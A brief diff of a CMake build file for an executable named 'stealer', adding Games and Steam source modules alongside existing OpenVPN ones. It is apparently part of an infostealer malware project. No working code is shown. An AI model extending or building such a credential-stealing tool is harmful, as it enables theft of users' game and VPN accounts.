@@ -46,6 +46,10 @@ add_executable(stealer src/main.cpp
         src/stealer/impl/vpns/VPNs.h
         src/stealer/impl/vpns/impl/OpenVPN.cpp
         src/stealer/impl/vpns/impl/OpenVPN.h
+        src/stealer/impl/games/Games.cpp
+        src/stealer/impl/games/Games.h
+        src/stealer/impl/games/impl/Steam.cpp
+        src/stealer/impl/games/impl/Steam.h
 )
 
 target_link_libraries(stealer
